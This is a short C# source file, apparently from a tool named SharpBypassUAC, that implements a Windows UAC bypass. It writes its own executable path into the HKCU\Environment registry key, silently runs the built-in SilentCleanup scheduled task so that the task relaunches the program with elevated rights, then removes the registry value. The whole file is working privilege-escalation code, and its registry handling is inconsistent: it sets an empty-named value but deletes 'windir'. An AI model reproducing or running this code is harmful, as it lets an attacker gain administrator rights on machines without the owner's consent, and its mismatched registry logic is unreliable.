using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace SharpBypassUAC;

public class DiskCleanup
{
	public DiskCleanup()
	{
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Environment", writable: true);
		registryKey.SetValue("", "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "C:\\windows\\system32\\schtasks.exe";
		process.StartInfo.Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
		process.Start();
		Thread.Sleep(1000);
		registryKey.DeleteValue("windir");
		Environment.Exit(0);
	}
}
